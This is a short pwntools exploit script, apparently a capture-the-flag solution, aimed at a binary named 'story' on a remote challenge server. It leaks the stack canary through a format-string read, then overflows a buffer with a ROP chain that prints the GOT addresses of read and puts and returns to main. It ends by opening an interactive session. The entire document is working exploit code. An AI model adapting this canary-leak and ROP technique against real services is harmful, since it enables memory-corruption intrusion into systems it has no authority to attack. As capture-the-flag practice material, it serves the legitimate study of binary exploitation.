from pwn import *

context.log_level='DEBUG'

r=remote('ctf2.linkedbyx.com',10755)
#r=process('./story')
elf=ELF('./story')

'''
rop_chain=
payload='a'*0x90+canary+'b'*8+rop_chain
r.sendlineafter('Tell me the size of your story:',payload)
'''

'''
0x0000000000400bd3 : pop rdi ; ret
'''

main=0x0000000000400876

r.sendlineafter('Please Tell Your ID:','%15$p')
r.recvuntil('Hello ')
canary=int(r.recv(18),16)
success('canary:'+hex(canary))

payload='a'*0x88+p64(canary)+'b'*8+p64(0x0000000000400bd3)+p64(elf.got['read'])+p64(elf.plt['puts'])+p64(main)
r.sendlineafter(':','1024')
r.sendlineafter(':',payload)
read=r.recv(12)
print read
#success('read:'+hex(read))

#r.interactive()

r.sendlineafter('Please Tell Your ID:','%15$p')
r.recvuntil('Hello ')
canary=int(r.recv(18),16)
success('canary:'+hex(canary))

payload='a'*0x88+p64(canary)+'b'*8+p64(0x0000000000400bd3)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(main)
r.sendlineafter(':','1024')
r.sendlineafter(':',payload)
puts=r.recv(12)
print puts

r.interactive()

